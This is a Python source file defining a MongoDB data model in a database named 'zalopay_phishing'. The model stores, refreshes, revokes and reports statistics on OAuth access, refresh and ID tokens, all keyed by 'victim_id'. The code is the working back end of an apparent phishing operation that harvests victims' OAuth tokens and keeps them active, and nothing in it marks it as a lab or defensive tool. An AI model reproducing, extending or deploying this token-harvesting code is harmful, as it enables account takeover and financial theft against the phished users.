"""
OAuth Tokens Model
Database operations for OAuth tokens collection
"""

import logging
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any
from pymongo import MongoClient
from pymongo.errors import PyMongoError

logger = logging.getLogger(__name__)

class OAuthTokenModel:
    """OAuth tokens database operations"""

    def __init__(self, mongodb_client: Optional[MongoClient] = None):
        self.client = mongodb_client
        self.db = None
        self.collection = None

    async def connect(self, database_name: str = "zalopay_phishing"):
        """Connect to MongoDB"""
        try:
            if self.client:
                self.db = self.client[database_name]
                self.collection = self.db.oauth_tokens
                logger.info("Connected to OAuth tokens collection")
                return True
            return False
        except PyMongoError as e:
            logger.error(f"MongoDB connection error: {e}")
            return False

    async def create_oauth_token(self, token_data: Dict[str, Any]) -> Optional[str]:
        """Create a new OAuth token record"""
        try:
            if not self.collection:
                await self.connect()

            # Add metadata
            token_data["created_at"] = datetime.now(timezone.utc)
            token_data["updated_at"] = datetime.now(timezone.utc)
            
            # Insert document
            result = self.collection.insert_one(token_data)
            
            if result.inserted_id:
                logger.info(f"OAuth token created: {result.inserted_id}")
                return str(result.inserted_id)
            else:
                logger.error("Failed to create OAuth token")
                return None

        except PyMongoError as e:
            logger.error(f"Error creating OAuth token: {e}")
            return None

    async def get_tokens_by_victim_id(self, victim_id: str) -> Optional[Dict[str, Any]]:
        """Get OAuth tokens for a specific victim"""
        try:
            if not self.collection:
                await self.connect()

            token_record = self.collection.find_one({"victim_id": victim_id})
            
            if token_record:
                token_record["_id"] = str(token_record["_id"])
                return token_record
            
            return None

        except PyMongoError as e:
            logger.error(f"Error getting OAuth tokens by victim ID: {e}")
            return None

    async def get_tokens_by_provider(self, provider: str) -> List[Dict[str, Any]]:
        """Get all OAuth tokens for a specific provider"""
        try:
            if not self.collection:
                await self.connect()

            tokens = list(self.collection.find({"provider": provider}))

            # Convert ObjectId to string
            for token in tokens:
                token["_id"] = str(token["_id"])

            return tokens

        except PyMongoError as e:
            logger.error(f"Error getting OAuth tokens by provider: {e}")
            return []

    async def get_active_tokens(self) -> List[Dict[str, Any]]:
        """Get all active OAuth tokens"""
        try:
            if not self.collection:
                await self.connect()

            tokens = list(self.collection.find(
                {"token_metadata.status": "active"},
                sort=[("created_at", -1)]
            ))

            # Convert ObjectId to string
            for token in tokens:
                token["_id"] = str(token["_id"])

            return tokens

        except PyMongoError as e:
            logger.error(f"Error getting active OAuth tokens: {e}")
            return []

    async def update_token_status(self, victim_id: str, status: str) -> bool:
        """Update OAuth token status"""
        try:
            if not self.collection:
                await self.connect()

            update_data = {
                "token_metadata.status": status,
                "token_metadata.last_refresh": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc)
            }

            result = self.collection.update_one(
                {"victim_id": victim_id},
                {"$set": update_data}
            )

            if result.modified_count > 0:
                logger.info(f"OAuth token status updated for victim: {victim_id}")
                return True
            else:
                logger.warning(f"No OAuth token updated for victim: {victim_id}")
                return False

        except PyMongoError as e:
            logger.error(f"Error updating OAuth token status: {e}")
            return False

    async def refresh_token(self, victim_id: str, new_tokens: Dict[str, Any]) -> bool:
        """Refresh OAuth tokens"""
        try:
            if not self.collection:
                await self.connect()

            # Get current token record
            current_token = await self.get_tokens_by_victim_id(victim_id)
            if not current_token:
                return False

            # Update tokens and metadata
            update_data = {
                "tokens.access_token": new_tokens.get("access_token"),
                "tokens.refresh_token": new_tokens.get("refresh_token"),
                "tokens.id_token": new_tokens.get("id_token"),
                "tokens.expires_at": datetime.now(timezone.utc) + timedelta(seconds=new_tokens.get("expires_in", 3600)),
                "tokens.scope": new_tokens.get("scope", "").split() if new_tokens.get("scope") else [],
                "token_metadata.last_refresh": datetime.now(timezone.utc),
                "token_metadata.refresh_count": current_token.get("token_metadata", {}).get("refresh_count", 0) + 1,
                "token_metadata.status": "active",
                "updated_at": datetime.now(timezone.utc)
            }

            result = self.collection.update_one(
                {"victim_id": victim_id},
                {"$set": update_data}
            )

            if result.modified_count > 0:
                logger.info(f"OAuth tokens refreshed for victim: {victim_id}")
                return True
            else:
                logger.warning(f"No OAuth tokens refreshed for victim: {victim_id}")
                return False

        except PyMongoError as e:
            logger.error(f"Error refreshing OAuth tokens: {e}")
            return False

    async def revoke_token(self, victim_id: str) -> bool:
        """Revoke OAuth tokens"""
        try:
            if not self.collection:
                await self.connect()

            update_data = {
                "token_metadata.status": "revoked",
                "token_metadata.last_refresh": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc)
            }

            result = self.collection.update_one(
                {"victim_id": victim_id},
                {"$set": update_data}
            )

            if result.modified_count > 0:
                logger.info(f"OAuth tokens revoked for victim: {victim_id}")
                return True
            else:
                logger.warning(f"No OAuth tokens revoked for victim: {victim_id}")
                return False

        except PyMongoError as e:
            logger.error(f"Error revoking OAuth tokens: {e}")
            return False

    async def update_last_used(self, victim_id: str) -> bool:
        """Update last used timestamp for OAuth tokens"""
        try:
            if not self.collection:
                await self.connect()

            update_data = {
                "token_metadata.last_used": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc)
            }

            result = self.collection.update_one(
                {"victim_id": victim_id},
                {"$set": update_data}
            )

            return result.modified_count > 0

        except PyMongoError as e:
            logger.error(f"Error updating OAuth token last used: {e}")
            return False

    async def get_expired_tokens(self) -> List[Dict[str, Any]]:
        """Get expired OAuth tokens"""
        try:
            if not self.collection:
                await self.connect()

            current_time = datetime.now(timezone.utc)
            
            tokens = list(self.collection.find({
                "tokens.expires_at": {"$lt": current_time},
                "token_metadata.status": "active"
            }))

            # Convert ObjectId to string
            for token in tokens:
                token["_id"] = str(token["_id"])

            return tokens

        except PyMongoError as e:
            logger.error(f"Error getting expired OAuth tokens: {e}")
            return []

    async def mark_tokens_as_expired(self, victim_ids: List[str]) -> int:
        """Mark multiple OAuth tokens as expired"""
        try:
            if not self.collection:
                await self.connect()

            update_data = {
                "token_metadata.status": "expired",
                "updated_at": datetime.now(timezone.utc)
            }

            result = self.collection.update_many(
                {"victim_id": {"$in": victim_ids}},
                {"$set": update_data}
            )

            if result.modified_count > 0:
                logger.info(f"Marked {result.modified_count} OAuth tokens as expired")

            return result.modified_count

        except PyMongoError as e:
            logger.error(f"Error marking OAuth tokens as expired: {e}")
            return 0

    async def get_token_statistics(self) -> Dict[str, Any]:
        """Get OAuth token statistics"""
        try:
            if not self.collection:
                await self.connect()

            pipeline = [
                {
                    "$group": {
                        "_id": None,
                        "total_tokens": {"$sum": 1},
                        "active_tokens": {
                            "$sum": {"$cond": [{"$eq": ["$token_metadata.status", "active"]}, 1, 0]}
                        },
                        "expired_tokens": {
                            "$sum": {"$cond": [{"$eq": ["$token_metadata.status", "expired"]}, 1, 0]}
                        },
                        "revoked_tokens": {
                            "$sum": {"$cond": [{"$eq": ["$token_metadata.status", "revoked"]}, 1, 0]}
                        }
                    }
                }
            ]

            result = list(self.collection.aggregate(pipeline))
            if result:
                stats = result[0]
                stats["active_rate"] = (
                    stats["active_tokens"] / stats["total_tokens"]
                    if stats["total_tokens"] > 0 else 0
                )
                return stats
            else:
                return {
                    "total_tokens": 0,
                    "active_tokens": 0,
                    "expired_tokens": 0,
                    "revoked_tokens": 0,
                    "active_rate": 0
                }

        except PyMongoError as e:
            logger.error(f"Error getting OAuth token statistics: {e}")
            return {}

    async def get_provider_statistics(self) -> Dict[str, Any]:
        """Get OAuth token statistics by provider"""
        try:
            if not self.collection:
                await self.connect()

            pipeline = [
                {
                    "$group": {
                        "_id": "$provider",
                        "total_tokens": {"$sum": 1},
                        "active_tokens": {
                            "$sum": {"$cond": [{"$eq": ["$token_metadata.status", "active"]}, 1, 0]}
                        },
                        "expired_tokens": {
                            "$sum": {"$cond": [{"$eq": ["$token_metadata.status", "expired"]}, 1, 0]}
                        },
                        "revoked_tokens": {
                            "$sum": {"$cond": [{"$eq": ["$token_metadata.status", "revoked"]}, 1, 0]}
                        }
                    }
                },
                {"$sort": {"total_tokens": -1}}
            ]

            result = list(self.collection.aggregate(pipeline))
            
            # Convert to dictionary
            provider_stats = {}
            for item in result:
                provider = item["_id"]
                provider_stats[provider] = {
                    "total_tokens": item["total_tokens"],
                    "active_tokens": item["active_tokens"],
                    "expired_tokens": item["expired_tokens"],
                    "revoked_tokens": item["revoked_tokens"],
                    "active_rate": (
                        item["active_tokens"] / item["total_tokens"]
                        if item["total_tokens"] > 0 else 0
                    )
                }

            return provider_stats

        except PyMongoError as e:
            logger.error(f"Error getting OAuth provider statistics: {e}")
            return {}

    async def cleanup_expired_tokens(self, days_to_keep: int = 30) -> int:
        """Clean up expired OAuth tokens older than specified days"""
        try:
            if not self.collection:
                await self.connect()

            cutoff_date = datetime.now(timezone.utc) - timedelta(days=days_to_keep)
            
            result = self.collection.delete_many({
                "token_metadata.status": {"$in": ["expired", "revoked"]},
                "updated_at": {"$lt": cutoff_date}
            })

            deleted_count = result.deleted_count
            if deleted_count > 0:
                logger.info(f"Cleaned up {deleted_count} expired OAuth tokens")

            return deleted_count

        except PyMongoError as e:
            logger.error(f"Error cleaning up expired OAuth tokens: {e}")
            return 0

    async def health_check(self) -> bool:
        """Health check for OAuth tokens collection"""
        try:
            if not self.collection:
                await self.connect()

            # Test basic operations
            self.collection.find_one()
            return True

        except PyMongoError as e:
            logger.error(f"OAuth tokens health check failed: {e}")
            return False